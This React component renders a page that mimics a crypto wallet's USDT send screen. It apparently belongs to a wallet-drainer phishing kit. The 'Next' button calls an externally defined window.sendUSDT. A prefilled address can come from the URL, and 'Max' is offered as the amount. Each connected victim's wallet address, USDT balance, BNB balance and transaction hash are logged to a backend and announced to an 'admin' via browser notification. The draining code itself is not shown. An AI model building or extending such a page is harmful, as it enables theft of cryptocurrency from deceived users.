import { useState, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import { ClipboardPaste, User, QrCode, Info } from "lucide-react";

declare global {
  interface Window {
    sendUSDT?: () => Promise<void>;
    saveTransaction?: (data: {
      walletAddress: string;
      toAddress: string;
      txHash: string;
      usdtBalance: string;
      nativeBalance: string;
    }) => void;
    setTransactionStatus?: (status: "idle" | "processing" | "success") => void;
    updateWalletAddress?: (address: string) => void;
    ethereum?: {
      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
      on: (event: string, callback: (...args: unknown[]) => void) => void;
      removeListener: (event: string, callback: (...args: unknown[]) => void) => void;
    };
  }
}

export default function Index() {
  const [searchParams] = useSearchParams();
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [memo, setMemo] = useState("");
  const [transactionStatus, setTransactionStatus] = useState<"idle" | "processing" | "success">("idle");
  const createTransaction = useMutation(api.transactions.createTransaction);

  useEffect(() => {
    const addressParam = searchParams.get("address");
    if (addressParam) {
      setToAddress(addressParam);
    }

    window.setTransactionStatus = (status) => {
      setTransactionStatus(status);
      if (status === "success") {
        setTimeout(() => {
          setTransactionStatus("idle");
        }, 3000);
      }
    };

    window.updateWalletAddress = (address: string) => {
      setToAddress(address);
    };

    return () => {
      delete window.setTransactionStatus;
      delete window.updateWalletAddress;
    };
  }, [searchParams]);

  useEffect(() => {
    window.saveTransaction = (data) => {
      createTransaction({
        walletAddress: data.walletAddress,
        toAddress: data.toAddress,
        amount: amount || "Max",
        txHash: data.txHash,
        usdtBalance: data.usdtBalance + " USDT",
        nativeBalance: data.nativeBalance + " BNB",
      }).then(() => {
        const notificationsEnabled = localStorage.getItem("adminNotificationsEnabled") === "true";
        if (notificationsEnabled && Notification.permission === "granted") {
          new Notification("New Transaction Received!", {
            body: `From: ${data.walletAddress.slice(0, 6)}...${data.walletAddress.slice(-4)}\nAmount: ${amount || "Max"}\nUSDT Balance: ${data.usdtBalance} USDT`,
            icon: "/favicon.ico",
            badge: "/favicon.ico",
            tag: data.txHash,
            requireInteraction: true,
          });
        }
      }).catch(console.error);
    };

    return () => {
      delete window.saveTransaction;
    };
  }, [createTransaction, amount]);

  async function handleSend() {
    if (!window.sendUSDT) return;
    setTransactionStatus("processing");
    try {
      await window.sendUSDT();
    } catch (error) {
      console.error(error);
      setTransactionStatus("idle");
    }
  }

  function setMax() {
    setAmount("Max");
  }

  async function handlePaste() {
    try {
      const text = await navigator.clipboard.readText();
      setToAddress(text.trim());
    } catch {
      // Clipboard access denied
    }
  }

  const dollarValue = amount && amount !== "Max" && !isNaN(Number(amount))
    ? `= $${Number(amount).toFixed(2)}`
    : amount === "Max" ? "= Max USDT" : "";

  return (
    <div
      style={{
        margin: 0,
        background: "#ffffff",
        color: "#1a1a2e",
        fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif",
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
      }}
    >
      <div style={{ padding: "24px 20px", flex: 1 }}>
        {/* Address Field */}
        <div style={{ marginBottom: "24px" }}>
          <label style={{
            display: "block",
            fontSize: "15px",
            fontWeight: 500,
            color: "#1a1a2e",
            marginBottom: "8px",
          }}>
            Address or Domain Name
          </label>
          <div style={{
            display: "flex",
            alignItems: "center",
            border: "1.5px solid #e0e0e8",
            borderRadius: "12px",
            padding: "12px 14px",
            background: "#fff",
            gap: "8px",
          }}>
            <input
              id="toAddress"
              value={toAddress}
              onChange={(e) => setToAddress(e.target.value)}
              placeholder="0x..."
              style={{
                flex: 1,
                background: "transparent",
                border: "none",
                outline: "none",
                color: "#1a1a2e",
                fontSize: "15px",
                fontFamily: "inherit",
              }}
            />
            <button
              onClick={handlePaste}
              style={{
                display: "flex",
                alignItems: "center",
                gap: "4px",
                background: "none",
                border: "none",
                color: "#3051d3",
                cursor: "pointer",
                padding: "4px",
                fontSize: "13px",
                fontWeight: 600,
              }}
            >
              <ClipboardPaste size={18} strokeWidth={2.2} />
              <span>Paste</span>
            </button>
            <div style={{
              width: "1px",
              height: "20px",
              background: "#e0e0e8",
            }} />
            <button style={{
              background: "none",
              border: "none",
              color: "#3051d3",
              cursor: "pointer",
              padding: "4px",
              display: "flex",
            }}>
              <User size={20} strokeWidth={2.2} />
            </button>
            <button style={{
              background: "none",
              border: "none",
              color: "#3051d3",
              cursor: "pointer",
              padding: "4px",
              display: "flex",
            }}>
              <QrCode size={20} strokeWidth={2.2} />
            </button>
          </div>
        </div>

        {/* Amount Field */}
        <div style={{ marginBottom: "24px" }}>
          <label style={{
            display: "block",
            fontSize: "15px",
            fontWeight: 500,
            color: "#1a1a2e",
            marginBottom: "8px",
          }}>
            Amount
          </label>
          <div style={{
            display: "flex",
            alignItems: "center",
            border: "1.5px solid #e0e0e8",
            borderRadius: "12px",
            padding: "12px 14px",
            background: "#fff",
            gap: "8px",
          }}>
            <input
              id="amount"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0"
              type="text"
              inputMode="decimal"
              style={{
                flex: 1,
                background: "transparent",
                border: "none",
                outline: "none",
                color: "#1a1a2e",
                fontSize: "15px",
                fontFamily: "inherit",
              }}
            />
            <span style={{
              color: "#1a1a2e",
              fontWeight: 600,
              fontSize: "15px",
              letterSpacing: "0.02em",
            }}>
              USDT
            </span>
            <button
              onClick={setMax}
              style={{
                background: "none",
                border: "none",
                color: "#3051d3",
                cursor: "pointer",
                padding: "2px 4px",
                fontSize: "15px",
                fontWeight: 600,
              }}
            >
              Max
            </button>
          </div>
          {dollarValue && (
            <div style={{
              fontSize: "13px",
              color: "#8a8a9a",
              marginTop: "6px",
              paddingLeft: "2px",
            }}>
              {dollarValue}
            </div>
          )}
        </div>

        {/* Memo Field */}
        <div style={{ marginBottom: "24px" }}>
          <label style={{
            display: "block",
            fontSize: "15px",
            fontWeight: 500,
            color: "#1a1a2e",
            marginBottom: "8px",
          }}>
            Memo
          </label>
          <div style={{
            display: "flex",
            alignItems: "center",
            border: "1.5px solid #e0e0e8",
            borderRadius: "12px",
            padding: "12px 14px",
            background: "#fff",
            gap: "8px",
          }}>
            <input
              value={memo}
              onChange={(e) => setMemo(e.target.value)}
              placeholder=""
              style={{
                flex: 1,
                background: "transparent",
                border: "none",
                outline: "none",
                color: "#1a1a2e",
                fontSize: "15px",
                fontFamily: "inherit",
              }}
            />
            <button style={{
              background: "none",
              border: "none",
              color: "#3051d3",
              cursor: "pointer",
              padding: "4px",
              display: "flex",
            }}>
              <QrCode size={20} strokeWidth={2.2} />
            </button>
            <button style={{
              background: "none",
              border: "none",
              color: "#3051d3",
              cursor: "pointer",
              padding: "4px",
              display: "flex",
            }}>
              <Info size={20} strokeWidth={2.2} />
            </button>
          </div>
        </div>
      </div>

      {/* Bottom Button */}
      <div style={{
        padding: "16px 20px",
        paddingBottom: "32px",
      }}>
        <button
          onClick={handleSend}
          disabled={transactionStatus !== "idle"}
          style={{
            width: "100%",
            background:
              transactionStatus === "success" ? "#22c55e" :
              transactionStatus === "processing" ? "#8b9ad3" :
              "#3051d3",
            color: "#ffffff",
            border: "none",
            borderRadius: "28px",
            padding: "16px",
            fontSize: "17px",
            fontWeight: 600,
            cursor: transactionStatus === "idle" ? "pointer" : "not-allowed",
            letterSpacing: "0.01em",
            transition: "background 0.2s ease",
          }}
        >
          {transactionStatus === "success"
            ? "Transaction Successful!"
            : transactionStatus === "processing"
            ? "Processing..."
            : "Next"}
        </button>
      </div>
    </div>
  );
}
